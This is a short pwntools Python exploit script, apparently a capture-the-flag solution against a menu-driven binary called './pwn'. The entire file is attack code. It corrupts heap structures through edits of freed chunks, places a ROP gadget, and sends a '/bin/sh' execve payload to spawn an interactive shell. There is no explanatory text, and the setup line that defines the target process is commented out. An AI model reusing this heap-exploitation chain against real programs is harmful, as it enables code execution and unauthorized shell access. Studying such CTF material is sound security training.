from pwn import *

# p = process('./pwn')
context.log_level = 'debug'
def launch_gdb():
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])

def add(i,c):
    p.sendlineafter('>','1')
    p.recvuntil('id')
    p.sendline(str(i))
    p.sendafter('input',c)

def edit(i,c):
    p.sendlineafter('>','3')
    p.recvuntil('id')
    p.sendline(str(i))
    p.sendafter('input',c)

def dele(i):
    p.sendlineafter('>','2')
    p.recvuntil('id')
    p.sendline(str(i))

bins_addr = 0x00000000006cb858
data_addr = 0x6CCBB0
add(0,'aaa')
add(1,'aaa')
dele(0)
edit(0,p64(data_addr-0x10) * 2)
regs = '\x00' * 0x68 + p64(data_addr - 0xf0) 
regs = regs.ljust(0xa0,'\x00') + p64(data_addr - 0xf0 + 16) + p64(0x0000000000480b86)
add(1,regs)
edit(0,p64(0x6ccab0)+ p64(0) + p64(bins_addr)*2)
'''
0x0000000000480b86 : pop rax ; pop rdx ; pop rbx ; ret
'''
payload = '/bin/sh\x00' + p64(59) + p64(59) + p64(0)*2 + p64(0x40F4FA)

add(2,payload.ljust(0xf0,'\x00') + p64(0x6CD608))
edit(0,p64(0x40F519))
dele(1)

p.interactive()